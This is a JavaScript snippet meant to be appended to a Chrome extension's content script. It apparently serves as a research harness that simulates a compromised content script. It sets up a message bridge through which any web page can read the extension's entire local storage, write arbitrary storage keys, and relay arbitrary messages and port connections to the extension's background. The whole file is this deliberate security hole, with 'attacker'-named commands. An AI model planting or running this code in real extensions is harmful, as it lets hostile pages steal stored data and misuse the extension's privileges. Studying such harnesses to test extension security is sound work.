// Append this to the content script of a Chrome extension.

var port;
window.addEventListener("message",
    function(event) {
        if (event.source !== window || !event.data || event.data.type !== "FROM_PAGE") {
            return;
        }
        let req = event.data.req;
        if (req === "attackerReadExtensionStorageLocal") {
            chrome.storage.local.get(null, function(items) { // null to return the entire storage
                console.log("Local extension storage read, sending response...");
                window.postMessage({type: "FROM_EXTENSION", resp: "responseAttackerReadExtensionStorageLocal", payload: items});
            });
            return true;
        } else if (req === "attackerWriteExtensionStorageLocal") {
            chrome.storage.local.set({[event.data.key]: event.data.value}).then(() => {
                  console.log("Value set");
            });
        } else if (req === "attackerSendMessage") {
            let message = event.data.payload;
            chrome.runtime.sendMessage(message, (response) => {
                window.postMessage({type: "FROM_EXTENSION", resp: "responseAttackerSendMessage", payload: response});
            });
        } else if (req === "attackerSendMessageIgnoreResponse") {
            let message = event.data.payload;
            chrome.runtime.sendMessage(message);
        } else if (req === "attackerRedirectAndSendMessageOnUnload") {
            let message = event.data.payload;
            let redirect_destination = event.data.redirect_destination;
            window.addEventListener("unload", (event) => {
                chrome.runtime.sendMessage(message);
            });
            window.location.href = redirect_destination;
            // Do not use window.location.replace() as then you won't be able to use the back button!
        } else if (req === "attackerOpenConnection") {
            port = chrome.runtime.connect();
            port.onMessage.addListener((msg, p) => {
                window.postMessage({type: "FROM_EXTENSION", resp: "responseAttackerPortMessage", payload: msg});
            })
            port.onDisconnect.addListener((p) => {
                window.postMessage({type: "FROM_EXTENSION", resp: "responseAttackerPortDisconnect"});
            })
        } else if (req === "attackerPostMessageOnPort") {
            let message = event.data.payload;
            port.postMessage(message);
        } else if (req === "attackerCloseConnection") {
            port.disconnect();
        }
    }
);
